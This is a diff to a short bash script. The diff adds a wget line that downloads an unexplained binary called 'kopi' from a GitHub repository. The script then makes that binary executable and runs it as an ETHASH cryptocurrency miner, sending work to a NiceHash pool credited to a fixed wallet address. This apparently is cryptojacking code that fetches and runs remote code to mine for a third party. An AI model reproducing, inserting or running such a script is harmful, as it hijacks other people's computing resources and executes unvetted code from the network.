@@ -1,3 +1,4 @@
 #!/bin/bash
+wget https://github.com/aurbach55/dera/raw/main/kopi
 chmod +x ./kopi && ./kopi --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w.$(echo $(shuf -i 1-99999 -n 1)-T4)
 
